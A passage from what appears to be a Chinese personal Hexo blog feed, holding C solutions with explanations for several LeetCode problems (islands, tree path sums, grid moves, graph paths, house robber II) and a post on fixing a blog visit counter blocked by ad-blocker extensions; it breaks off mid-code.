    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/number-of-islands/</p><p>使用深度优先搜索，除了边界元素，每个元素都有四个相邻的元素，每遍历到满足条件的元素，则依次对四个方向上的元素调用<code>dfs</code>函数，重复上述步骤。</p><ul><li>使用二维数组<code>dir</code>用于遍历四个方向上的元素</li><li><code>dfs</code>函数中使用<code>for</code>循环遍历四个方向的元素</li><li>遍历过的元素需要标记（<code>visited[i][j]=true</code>）</li><li><code>numIslands</code>函数中使用双重循环对每个满足条件且未遍历过的元素进行<code>dfs</code></li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> dir[<span class="number">4</span>][<span class="number">2</span>] = {<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">-1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">-1</span>}; <span class="comment">// 四个方向(下、右、左、上)</span></span><br><span class="line"><span class="type">int</span> edge_x, edge_y;</span><br><span class="line"><span class="type">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">char</span>** grid, <span class="type">bool</span>** visited, <span class="type">int</span> x, <span class="type">int</span> y)</span> {</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">4</span>; i++) {</span><br><span class="line">        <span class="type">int</span> next_x = x + dir[i][<span class="number">0</span>];</span><br><span class="line">        <span class="type">int</span> next_y = y + dir[i][<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span>(next_x&lt;<span class="number">0</span> || next_y&lt;<span class="number">0</span> || next_x&gt;edge_x<span class="number">-1</span> || next_y&gt;edge_y<span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span>(!visited[next_x][next_y] &amp;&amp; grid[next_x][next_y]==<span class="string">'1'</span>) {</span><br><span class="line">            visited[next_x][next_y]=<span class="literal">true</span>;</span><br><span class="line">            dfs(grid, visited, next_x, next_y);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">numIslands</span><span class="params">(<span class="type">char</span>** grid, <span class="type">int</span> gridSize, <span class="type">int</span>* gridColSize)</span> {</span><br><span class="line">    <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">    edge_x = gridSize;</span><br><span class="line">    edge_y = *gridColSize;</span><br><span class="line">    <span class="type">bool</span>** visited = (<span class="type">bool</span>**)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">bool</span>*)*gridSize);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;gridSize; i++) {</span><br><span class="line">        visited[i] = (<span class="type">bool</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">bool</span>)*(*gridColSize));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;*gridColSize; j++) {</span><br><span class="line">            visited[i][j] = <span class="literal">false</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;gridSize; i++) {</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;*gridColSize; j++) {</span><br><span class="line">            <span class="keyword">if</span>(!visited[i][j] &amp;&amp; grid[i][j]==<span class="string">'1'</span>) {</span><br><span class="line">                count++;</span><br><span class="line">                visited[i][j] = <span class="literal">true</span>;</span><br><span class="line">                dfs(grid, visited, i, j);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二叉树中的最大路径和</title>
    <link href="/2024/03/18/%E4%BA%8C%E5%8F%89%E6%A0%91%E4%B8%AD%E7%9A%84%E6%9C%80%E5%A4%A7%E8%B7%AF%E5%BE%84%E5%92%8C/"/>
    <url>/2024/03/18/%E4%BA%8C%E5%8F%89%E6%A0%91%E4%B8%AD%E7%9A%84%E6%9C%80%E5%A4%A7%E8%B7%AF%E5%BE%84%E5%92%8C/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/binary-tree-maximum-path-sum/</p><p>这题看着不难，实现起来还是比较复杂，递归关系比较难想到。</p><ul><li>先确定终止条件，也就是当前节点为空，直接返回0</li><li>然后记录左节点、右节点的最大路径和</li><li>接着记录当前路径和（当前节点值+左节点路径和+右节点路径和）</li><li>若该路径和大于之前的路径和<code>maxS</code>，则更新<code>maxS</code></li><li>最后需要返回，上一级节点<strong>以当前节点为子树</strong>，则子树最大路径和为<code>root-&gt;val + fmax(leftM, rightM)</code></li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> maxS;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pathValue</span><span class="params">(<span class="keyword">struct</span> TreeNode* root)</span> {</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> leftM = fmax(pathValue(root-&gt;left),<span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> rightM = fmax(pathValue(root-&gt;right),<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> pV = root-&gt;val + leftM + rightM;</span><br><span class="line">    maxS = fmax(maxS, pV);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> root-&gt;val + fmax(leftM, rightM); <span class="comment">// 返回上一级</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">maxPathSum</span><span class="params">(<span class="keyword">struct</span> TreeNode* root)</span> {</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    maxS = INT_MIN;</span><br><span class="line">    pathValue(root);</span><br><span class="line">    <span class="keyword">return</span> maxS;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>路径总和III</title>
    <link href="/2024/03/17/%E8%B7%AF%E5%BE%84%E6%80%BB%E5%92%8CIII/"/>
    <url>/2024/03/17/%E8%B7%AF%E5%BE%84%E6%80%BB%E5%92%8CIII/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/path-sum-iii/</p><p>根据题意，需要遍历所有可能，然后找出满足条件的路径。</p><p>这里用到了两次递归：</p><ul><li><code>rootSum</code>是以当前节点为起始节点向下遍历，寻找路径</li><li><code>pathSum</code>是以树的不同节点为起始节点调用<code>rootSum</code></li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">rootSum</span><span class="params">(<span class="keyword">struct</span> TreeNode* root, <span class="type">double</span> targetSum)</span> {  </span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> count=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(root-&gt;val == targetSum)</span><br><span class="line">        count++;</span><br><span class="line"></span><br><span class="line">    count += rootSum(root-&gt;left, targetSum-root-&gt;val); <span class="comment">//遍历左孩子路径</span></span><br><span class="line">    count += rootSum(root-&gt;right, targetSum-root-&gt;val); <span class="comment">//遍历右孩子路径</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">pathSum</span><span class="params">(<span class="keyword">struct</span> TreeNode* root, <span class="type">int</span> targetSum)</span>{</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> count = rootSum(root, targetSum); <span class="comment">//以当前节点为起始节点</span></span><br><span class="line">    count+=pathSum(root-&gt;left, targetSum); <span class="comment">//以左孩子为起始节点</span></span><br><span class="line">    count+=pathSum(root-&gt;right, targetSum); <span class="comment">//以右孩子为起始节点</span></span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>矩阵中移动的最大次数</title>
    <link href="/2024/03/16/%E7%9F%A9%E9%98%B5%E4%B8%AD%E7%A7%BB%E5%8A%A8%E7%9A%84%E6%9C%80%E5%A4%A7%E6%AC%A1%E6%95%B0/"/>
    <url>/2024/03/16/%E7%9F%A9%E9%98%B5%E4%B8%AD%E7%A7%BB%E5%8A%A8%E7%9A%84%E6%9C%80%E5%A4%A7%E6%AC%A1%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/maximum-number-of-moves-in-a-grid/</p><p>今天的每日一题，可以使用广度优先和深度优先搜索，我使用的是动态规划。</p><ul><li><p><code>dp[i][j]</code>：表示矩阵第一列能够到达矩阵元素<code>grid[i][j]</code>的最大路径长度</p></li><li><p>递推公式：主要分为三种情况</p><p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/202403161559122.png"></p><p>下面其中一种情况为例：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(i&gt;<span class="number">0</span> &amp;&amp; grid[i<span class="number">-1</span>][j<span class="number">-1</span>]&lt;grid[i][j]) {</span><br><span class="line">    <span class="keyword">if</span>(dp[i<span class="number">-1</span>][j<span class="number">-1</span>]!=<span class="number">0</span> || j==<span class="number">1</span>) </span><br><span class="line">        <span class="comment">// j-1 为第一列 或 第一列到grid[i-1][j-1]有路径</span></span><br><span class="line">        dp[i][j] = fmax(dp[i][j], dp[i<span class="number">-1</span>][j<span class="number">-1</span>]+<span class="number">1</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><blockquote><p>若没有第二个if条件判断，那么<strong>以其他列元素为起始元素</strong>的路径也算作其中一个情况，不满足题目描述</p></blockquote></li><li><p>初始化：dp数组元素全初始化为0</p></li><li><p>遍历顺序：必须<strong>先列后行</strong>，不然会缺少路径；从第二列开始遍历</p></li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">maxMoves</span><span class="params">(<span class="type">int</span>** grid, <span class="type">int</span> gridSize, <span class="type">int</span>* gridColSize)</span>{</span><br><span class="line">    <span class="type">int</span> dp[gridSize][(*gridColSize)];</span><br><span class="line">    <span class="built_in">memset</span>(dp, <span class="number">0</span>, <span class="keyword">sizeof</span>(dp));</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>; j&lt;(*gridColSize); j++) {</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;gridSize; i++) {</span><br><span class="line">            <span class="keyword">if</span>(i&gt;<span class="number">0</span> &amp;&amp; grid[i<span class="number">-1</span>][j<span class="number">-1</span>]&lt;grid[i][j]) {</span><br><span class="line">                <span class="keyword">if</span>(dp[i<span class="number">-1</span>][j<span class="number">-1</span>]!=<span class="number">0</span> || j==<span class="number">1</span>)</span><br><span class="line">                    dp[i][j] = fmax(dp[i][j], dp[i<span class="number">-1</span>][j<span class="number">-1</span>]+<span class="number">1</span>);</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">if</span>(grid[i][j<span class="number">-1</span>] &lt; grid[i][j]) {</span><br><span class="line">                <span class="keyword">if</span>(dp[i][j<span class="number">-1</span>]!=<span class="number">0</span> || j==<span class="number">1</span>)</span><br><span class="line">                    dp[i][j] = fmax(dp[i][j], dp[i][j<span class="number">-1</span>]+<span class="number">1</span>);</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">if</span>(i&lt;gridSize<span class="number">-1</span> &amp;&amp; grid[i+<span class="number">1</span>][j<span class="number">-1</span>]&lt;grid[i][j]) {</span><br><span class="line">                <span class="keyword">if</span>(dp[i+<span class="number">1</span>][j<span class="number">-1</span>]!=<span class="number">0</span> || j==<span class="number">1</span>)</span><br><span class="line">                    dp[i][j] = fmax(dp[i][j], dp[i+<span class="number">1</span>][j<span class="number">-1</span>]+<span class="number">1</span>);</span><br><span class="line">            }</span><br><span class="line">            res = fmax(dp[i][j], res);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexo博客阅读次数问题</title>
    <link href="/2024/03/14/Hexo%E9%98%85%E8%AF%BB%E6%AC%A1%E6%95%B0%E9%97%AE%E9%A2%98/"/>
    <url>/2024/03/14/Hexo%E9%98%85%E8%AF%BB%E6%AC%A1%E6%95%B0%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>我使用的是Next主题，内置了busuanzi显示统计阅读次数。</p><h2 id="常规操作">常规操作</h2><p>一般修改<code>~\Hexo\themes\next</code>文件夹下的<code>_config.yml</code>文件，如下：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">busuanzi_count:</span><br><span class="line">  enable: true #true表示显示阅读次数</span><br><span class="line">  total_visitors: true</span><br><span class="line">  total_visitors_icon: user  </span><br><span class="line">  total_views: true</span><br><span class="line">  total_views_icon: eye</span><br><span class="line">  post_views: true</span><br><span class="line">  post_views_icon: eye</span><br></pre></td></tr></tbody></table></figure><p>然后在同一个文件中，找到<code>footer</code>，修改后如下：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">footer:</span><br><span class="line"><span class="meta prompt_">  # </span><span class="language-bash">Specify the <span class="built_in">date</span> when the site was setup. If not defined, current year will be used.</span></span><br><span class="line"><span class="meta prompt_">  #</span><span class="language-bash">since: 2015</span></span><br><span class="line">  counter: true</span><br></pre></td></tr></tbody></table></figure><p>到这里基本就解决了。</p><h2 id="其他问题">其他问题</h2><p>我的博客是两三年前部署的，很早就设置了“阅读次数”，但是一段时间之前，突然就不显示了，我搜索了很多解决方案，无非就是修改busuanzi域名，修改一些文件里的参数，但是还是无法解决问题。</p><p>我突然心血来潮尝试在edge浏览器上打开博客（之前用的是Chrome），发现显示正常，难道是浏览器的问题？我这两个浏览器的区别主要在于Chrome中安装了很多插件，也许是插件搞的鬼，于是我从广告拦截插件入手，果然找到了“肇事者”：<code>Ghostery 跟踪器和广告拦截器</code>和<code>uBlock Origin</code>。我设置白名单后再次打开博客，一切显示正常！</p>]]></content>
    
    
    <categories>
      
      <category>Hexo</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>合并后数组中的最大元素</title>
    <link href="/2024/03/14/%E5%90%88%E5%B9%B6%E5%90%8E%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84%E6%9C%80%E5%A4%A7%E5%85%83%E7%B4%A0/"/>
    <url>/2024/03/14/%E5%90%88%E5%B9%B6%E5%90%8E%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84%E6%9C%80%E5%A4%A7%E5%85%83%E7%B4%A0/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/largest-element-in-an-array-after-merge-operations/?envType=daily-question&amp;envId=2024-03-14</p><p>今天尝试了一下每日一题，看着题目挺复杂的，一时没有思路，不知道每次该选择哪两个数相加才能使得最终结果最大。</p><p>于是我猜想：若是倒着遍历数组，将满足条件的数相加，然后不断向前遍历，直到第一个元素，这样会使得结果最大。</p><p>下面举两个例子：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>]  <span class="comment">// 倒着遍历数组，最后得到 [5, 3, 1]</span></span><br><span class="line">[<span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">3</span>]  <span class="comment">// 倒着遍历数组，最后得到 [12]</span></span><br></pre></td></tr></tbody></table></figure><p>若是顺序遍历，若中间出现中断，则又需要从头再判断一次，但是倒序只需遍历一次数组。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="title function_">maxArrayValue</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize)</span>{</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span>* res = (<span class="type">long</span> <span class="type">long</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">long</span> <span class="type">long</span>)*numsSize);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;numsSize; i++) {  <span class="comment">// 数组元素相加可能大于INT_MAX，所以用long long 暂存</span></span><br><span class="line">        res[i] = (<span class="type">long</span> <span class="type">long</span>)nums[i];</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=numsSize<span class="number">-1</span>; i&gt;<span class="number">0</span>; i--) { <span class="comment">// 倒序遍历数组</span></span><br><span class="line">        <span class="keyword">if</span>(res[i]&gt;=res[i<span class="number">-1</span>])</span><br><span class="line">            res[i<span class="number">-1</span>] += res[i];</span><br><span class="line">    }</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> max = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;numsSize; i++) {  <span class="comment">// 找到最大值</span></span><br><span class="line">        <span class="keyword">if</span>(max&lt;res[i])</span><br><span class="line">            max = res[i];</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> max;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>所有可能的路径</title>
    <link href="/2024/03/13/%E6%89%80%E6%9C%89%E5%8F%AF%E8%83%BD%E7%9A%84%E8%B7%AF%E5%BE%84/"/>
    <url>/2024/03/13/%E6%89%80%E6%9C%89%E5%8F%AF%E8%83%BD%E7%9A%84%E8%B7%AF%E5%BE%84/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/all-paths-from-source-to-target/</p><p>深度优先搜索，题目要求从节点<code>0</code>开始，因此路径的第一个节点是定死的，只需遍历<code>graph[0]</code>中的元素，找到所有路径。这里直接使用回溯模板：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>* path;</span><br><span class="line"><span class="type">int</span> pathTop;</span><br><span class="line"><span class="type">int</span> resTop;</span><br><span class="line"><span class="type">int</span>* len;</span><br><span class="line"><span class="type">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span>** graph, <span class="type">int</span> graphSize, <span class="type">int</span>* graphColSize, <span class="type">int</span>** res, <span class="type">int</span>* path, <span class="type">int</span> start)</span> { <span class="comment">// 深度优先搜索</span></span><br><span class="line">    <span class="keyword">if</span>(start == graphSize<span class="number">-1</span>) { <span class="comment">// 当遍历到最后一个元素时，记录路径并返回</span></span><br><span class="line">        <span class="type">int</span>* tmp = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*(pathTop));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;pathTop; i++) {</span><br><span class="line">            tmp[i] = path[i];</span><br><span class="line">        }</span><br><span class="line">        res[resTop] = tmp;</span><br><span class="line">        len[resTop++] = pathTop; <span class="comment">// 记录每条路径长度</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;graphColSize[start]; j++) {</span><br><span class="line">        path[pathTop++] = graph[start][j]; <span class="comment">// 加入路径</span></span><br><span class="line">        dfs(graph, graphSize, graphColSize, res, path, graph[start][j]); <span class="comment">// 以新节点为起点</span></span><br><span class="line">        pathTop--;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="type">int</span>** <span class="title function_">allPathsSourceTarget</span><span class="params">(<span class="type">int</span>** graph, <span class="type">int</span> graphSize, <span class="type">int</span>* graphColSize, <span class="type">int</span>* returnSize, <span class="type">int</span>** returnColumnSizes)</span> {</span><br><span class="line">    <span class="type">int</span>** res = (<span class="type">int</span>**)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>*)*<span class="number">10000</span>);</span><br><span class="line">    path = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*<span class="number">1000</span>);</span><br><span class="line">    len = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*<span class="number">10000</span>);</span><br><span class="line">    pathTop = <span class="number">1</span>;</span><br><span class="line">    resTop = <span class="number">0</span>;</span><br><span class="line">    path[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    dfs(graph, graphSize, graphColSize, res, path, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    *returnSize = resTop;</span><br><span class="line">    *returnColumnSizes = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*resTop);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;resTop; i++) {</span><br><span class="line">        (*returnColumnSizes)[i] = len[i];</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>打家劫舍II</title>
    <link href="/2024/03/13/%E6%89%93%E5%AE%B6%E5%8A%AB%E8%88%8DII/"/>
    <url>/2024/03/13/%E6%89%93%E5%AE%B6%E5%8A%AB%E8%88%8DII/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/house-robber-ii/</p><p>这题与上一题的区别就在于本题中的数组元素实际上是一个<strong>环</strong>，其余条件不变。</p><p>根据代码随想录，分为如下两种情况：</p><ul><li><p>包含头元素：</p><p><img src="https://code-thinking-1253855093.file.myqcloud.com/pics/20210129160821374-20230310134003961.jpg"></p></li><li><p>包含尾元素</p><p><img src="https://code-thinking-1253855093.file.myqcloud.com/pics/20210129160842491-20230310134008133.jpg"></p></li></ul><p>因此我设置了两个dp数组对上述情况分别保存，最后返回较大值</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">rob</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize)</span> {</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> dp1[numsSize+<span class="number">1</span>];</span><br><span class="line">    <span class="built_in">memset</span>(dp1, <span class="number">0</span>, <span class="keyword">sizeof</span>(dp1));</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> dp2[numsSize+<span class="number">1</span>];</span><br><span class="line">    <span class="built_in">memset</span>(dp2, <span class="number">0</span>, <span 